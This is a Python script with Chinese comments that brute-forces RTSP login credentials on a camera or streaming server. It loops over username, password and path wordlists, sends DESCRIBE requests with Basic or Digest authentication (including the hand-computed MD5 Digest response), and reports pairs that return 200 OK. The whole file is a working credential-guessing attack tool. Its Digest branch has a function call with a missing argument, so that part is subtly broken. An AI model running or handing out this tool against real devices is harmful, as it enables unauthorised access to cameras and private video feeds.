import socket
import hashlib
import base64


global config_dict
config_dict = {
    "server_ip": "192.168.1.40",
    "server_port": 554,
  # "server_path": "/chID=8&streamType=main",
    "server_path": "uri.txt",
    "user_agent": "RTSP Client",
    "buffer_len": 1024,
    "username_file": "username.txt",
    "password_file": "password.txt",
    "brute_force_method": 'Basic', # 'Basic' or 'Digest'
    "timeout": 3.0  # 添加超时设置
    }

# 生成Basic认证请求头，构造一个完整的包
def gen_base_method_header(auth_64, path):
    """
    生成Basic认证方法的请求头。

    参数:
    auth_64 -- base64编码后的用户名和密码组合字符串。

    返回:
    str_base_method_header -- 完整的认证请求头字符串。
    """
    global config_dict
    #build the prefix of msg to send
    str_base_method_header = 'DESCRIBE rtsp://'+config_dict["server_ip"]+':'+str(config_dict["server_port"])+ path + ' RTSP/1.0\r\n'
    str_base_method_header += 'CSeq: 4\r\n'
    str_base_method_header += 'User-Agent: '+config_dict["user_agent"]+'\r\n'
    str_base_method_header += 'Accept: application/sdp\r\n'
    str_base_method_header += 'Authorization: Basic '+auth_64 + ' \r\n'
    str_base_method_header += '\r\n'
    return str_base_method_header

# Basic认证暴力破解方法
def base_method_brute_force(socket_send,username,password,path):
    """
    使用Basic认证方式进行暴力破解。

    参数:
    socket_send -- 用于发送数据的socket对象。
    username -- 用户名。
    password -- 密码。
    """
    global config_dict
    # use base64 to encode username and password
    auth_64 = base64.b64encode((username + ":" + password).encode("utf-8")).decode()
    # try to auth server
    str_base_method_header = gen_base_method_header(auth_64, path)
    socket_send.send(str_base_method_header.encode())
    msg_recv = socket_send.recv(config_dict["buffer_len"]).decode()
    # if the server response '200 OK' It means the username and password pair is right
    if '200 OK' in msg_recv:
        print("found key --  " + username + ":" + password)

# 生成digest认证请求头
def gen_digest_describe_header():
    """
    生成Digest认证方法的请求头。

    返回:
    str_digest_describe_header -- 完整的认证请求头字符串。
    """
    global config_dict
    str_digest_describe_header = 'DESCRIBE rtsp://'+config_dict["server_ip"]+':'+str(config_dict["server_port"])+config_dict["server_path"] + ' RTSP/1.0\r\n'
    str_digest_describe_header += 'CSeq: 4\r\n'
    str_digest_describe_header += 'User-Agent: '+config_dict["user_agent"]+'\r\n'
    str_digest_describe_header += 'Accept: application/sdp\r\n'
    str_digest_describe_header += '\r\n'
    return str_digest_describe_header

# 
def gen_response_value(url,username,password,realm,nonce):
    """
    生成Digest认证中的response值。

    参数:
    url -- 请求的URL。
    username -- 用户名。
    password -- 密码。
    realm -- 服务器提供的realm值。
    nonce -- 服务器提供的nonce值。

    返回:
    response_value -- 计算得到的response值。
    """
    global config_dict
    frist_pre_md5_value = hashlib.md5((username + ':' + realm + ':' + password).encode()).hexdigest()
    first_post_md5_value = hashlib.md5(('DESCRIBE:' + url).encode()).hexdigest()
    response_value = hashlib.md5((frist_pre_md5_value + ':' + nonce + ':' + first_post_md5_value).encode()).hexdigest()
    return response_value


def gen_digest_describe_auth_header(username,password,realm_value,nonce_value,path):
    """
    生成包含Digest认证信息的请求头。

    参数:
    username -- 用户名。
    password -- 密码。
    realm_value -- 服务器提供的realm值。
    nonce_value -- 服务器提供的nonce值。

    返回:
    str_describe_auth_header -- 完整的认证请求头字符串。
    """
    global config_dict
    url = 'rtsp://' + config_dict['server_ip'] + ':' + str(config_dict['server_port']) + path
    response_value = gen_response_value(url, username, password,realm_value, nonce_value)
    str_describe_auth_header = 'DESCRIBE rtsp://' + config_dict['server_ip'] + ':' + str(config_dict['server_port']) + \
                               config_dict['server_path'] + ' RTSP/1.0\r\n'
    str_describe_auth_header += 'CSeq: 5\r\n'
    str_describe_auth_header += 'Authorization: Digest username="' + username + '", realm="' + realm_value + '", nonce="' + nonce_value + '", uri="' + url + '", response="' + response_value + '"\r\n'
    str_describe_auth_header += 'User-Agent: ' + config_dict['user_agent'] + '\r\n'
    str_describe_auth_header += 'Accept: application/sdp\r\n'
    str_describe_auth_header += '\r\n'
    return str_describe_auth_header


def digest_method_brute_force(socket_send,username,password,realm_value,nonce_value):
    """
    使用Digest认证方式进行暴力破解。

    参数:
    socket_send -- 用于发送数据的socket对象。
    username -- 用户名。
    password -- 密码。
    realm_value -- 服务器提供的realm值。
    nonce_value -- 服务器提供的nonce值。
    """
    global config_dict
    str_digest_describe_auth_header = gen_digest_describe_auth_header(username,password,realm_value,nonce_value)
    socket_send.send(str_digest_describe_auth_header.encode())
    msg_recv = socket_send.recv(config_dict['buffer_len']).decode()
    if '200 OK' in msg_recv:
        print("found key --  " + username + ":" + password)


#create socket to server
socket_send = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
socket_send.settimeout(config_dict["timeout"])  # 设置超时
socket_send.connect((config_dict["server_ip"],config_dict["server_port"]))

#decide use what method to brute force
if config_dict['brute_force_method'] == 'Basic':
    print('now use basic method to brute force')
    with open(config_dict["username_file"],"r") as usernames:
        for username in usernames:
            username = username.strip("\n")
            with open(config_dict["password_file"],"r") as passwords:
                for password in passwords:
                    password = password.strip("\n")
                    for path in open(config_dict["server_path"], "r"):
                        path = path.strip("\n")
                        print("[+] trying " + username + ":" + password + "@" + config_dict["server_ip"] + path)
                        base_method_brute_force(socket_send, username, password, path)
else:
    print('now use digest method to brute force')
    with open(config_dict["username_file"], "r") as usernames:
        for username in usernames:
            username = username.strip("\n")
            with open(config_dict["password_file"], "r") as passwords:
                for password in passwords:
                    password = password.strip("\n")
                    for path in open(config_dict["server_path"], "r"):
                        path = path.strip("\n")
                        str_digest_describe_header = gen_digest_describe_header()
                        socket_send.send(str_digest_describe_header.encode())
                        msg_recv = socket_send.recv(config_dict['buffer_len']).decode()
                        realm_pos = msg_recv.find('realm')
                        realm_value_begin_pos = msg_recv.find('"',realm_pos)+1
                        realm_value_end_pos = msg_recv.find('"',realm_pos+8)
                        realm_value = msg_recv[realm_value_begin_pos:realm_value_end_pos]
                        nonce_pos = msg_recv.find('nonce')
                        nonce_value_begin_pos = msg_recv.find('"',nonce_pos)+1
                        nonce_value_end_pos = msg_recv.find('"',nonce_pos+8)
                        nonce_value = msg_recv[nonce_value_begin_pos:nonce_value_end_pos]
                        print("trying " + username + ":" + password + ":" + config_dict["server_ip"] + path)
                        digest_method_brute_force(socket_send, username, password,realm_value,nonce_value)
socket_send.close()